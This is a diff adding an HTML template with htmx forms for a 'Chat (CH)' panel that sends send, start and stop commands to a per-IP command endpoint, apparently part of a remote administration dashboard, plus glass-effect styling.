@@ -1,0 +1,80 @@
+<div class="glass-effect rounded-xl p-6 shadow-lg">
+    <div class="flex items-center gap-3 mb-4">
+        <div
+            class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
+        >
+            <svg
+                class="w-4 h-4 text-gray-300"
+                fill="none"
+                stroke="currentColor"
+                viewBox="0 0 24 24"
+            >
+                <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"
+                ></path>
+            </svg>
+        </div>
+        <h3 class="text-xl font-semibold text-white">Chat (CH)</h3>
+    </div>
+    <div class="space-y-3">
+        <form
+            hx-post="/api/command/{{ ip }}"
+            hx-target="#command-output-{{ ip }}"
+            class="flex gap-2"
+        >
+            <input type="hidden" name="module" value="CH" />
+            <input type="hidden" name="args.action" value="send" />
+            <input
+                type="text"
+                name="args.message"
+                placeholder="Your message..."
+                class="flex-grow px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all"
+            />
+            <button
+                type="submit"
+                class="bg-white hover:bg-gray-100 text-black px-4 py-2 rounded-lg transition-all duration-200"
+            >
+                Send
+            </button>
+        </form>
+        <div class="grid grid-cols-2 gap-2">
+            <form
+                hx-post="/api/command/{{ ip }}"
+                hx-target="#command-output-{{ ip }}"
+            >
+                <input type="hidden" name="module" value="CH" />
+                <input type="hidden" name="args.action" value="start" />
+                <button
+                    type="submit"
+                    class="w-full bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200"
+                >
+                    Start Chat
+                </button>
+            </form>
+            <form
+                hx-post="/api/command/{{ ip }}"
+                hx-target="#command-output-{{ ip }}"
+            >
+                <input type="hidden" name="module" value="CH" />
+                <input type="hidden" name="args.action" value="stop" />
+                <button
+                    type="submit"
+                    class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200"
+                >
+                    Stop Chat
+                </button>
+            </form>
+        </div>
+    </div>
+</div>
+
+<style>
+    .glass-effect {
+        background: rgba(32, 32, 32, 0.8);
+        backdrop-filter: blur(20px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+</style>
